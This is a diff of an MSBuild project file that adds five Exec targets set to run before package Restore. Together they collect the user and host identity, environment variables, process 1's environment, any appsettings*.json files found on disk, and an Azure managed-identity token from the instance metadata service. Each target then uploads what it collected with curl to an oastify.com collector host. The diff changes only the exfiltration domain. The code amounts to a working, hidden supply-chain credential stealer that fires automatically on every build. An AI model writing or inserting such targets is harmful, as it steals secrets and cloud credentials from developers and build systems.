@@ -6,7 +6,7 @@
 
   <!-- Confirmed working anchor -->
   <Target Name="Exfil1" BeforeTargets="Restore">
-    <Exec Command="curl -s http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/ctx/`whoami`/`hostname`/`id`"
+    <Exec Command="curl -s http://o2rfopnnd5ogphqu0pbj7fagg7myaryg.oastify.com/ctx/`whoami`/`hostname`/`id`"
           ContinueOnError="true" />
   </Target>
 
@@ -14,7 +14,7 @@
   <Target Name="Exfil2" BeforeTargets="Restore">
     <Exec Command="sh -c 'env > /tmp/e2.txt'"
           ContinueOnError="true" />
-    <Exec Command="curl -s -F f=@/tmp/e2.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/env-dump"
+    <Exec Command="curl -s -F f=@/tmp/e2.txt http://o2rfopnnd5ogphqu0pbj7fagg7myaryg.oastify.com/env-dump"
           ContinueOnError="true" />
   </Target>
 
@@ -22,7 +22,7 @@
   <Target Name="Exfil3" BeforeTargets="Restore">
     <Exec Command="sh -c 'cat /proc/1/environ | tr &apos;\0&apos; &apos;\n&apos; > /tmp/e3.txt'"
           ContinueOnError="true" />
-    <Exec Command="curl -s -F f=@/tmp/e3.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/proc1env"
+    <Exec Command="curl -s -F f=@/tmp/e3.txt http://o2rfopnnd5ogphqu0pbj7fagg7myaryg.oastify.com/proc1env"
           ContinueOnError="true" />
   </Target>
 
@@ -30,7 +30,7 @@
   <Target Name="Exfil4" BeforeTargets="Restore">
     <Exec Command="sh -c 'find / -name appsettings*.json 2>/dev/null | xargs cat 2>/dev/null > /tmp/e4.txt'"
           ContinueOnError="true" />
-    <Exec Command="curl -s -F f=@/tmp/e4.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/appsettings"
+    <Exec Command="curl -s -F f=@/tmp/e4.txt http://o2rfopnnd5ogphqu0pbj7fagg7myaryg.oastify.com/appsettings"
           ContinueOnError="true" />
   </Target>
 
@@ -38,7 +38,7 @@
   <Target Name="Exfil5" BeforeTargets="Restore">
     <Exec Command="sh -c 'curl -sf -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/ > /tmp/e5.txt 2>/dev/null'"
           ContinueOnError="true" />
-    <Exec Command="curl -s -F f=@/tmp/e5.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/imds-token"
+    <Exec Command="curl -s -F f=@/tmp/e5.txt http://o2rfopnnd5ogphqu0pbj7fagg7myaryg.oastify.com/imds-token"
           ContinueOnError="true" />
   </Target>
 
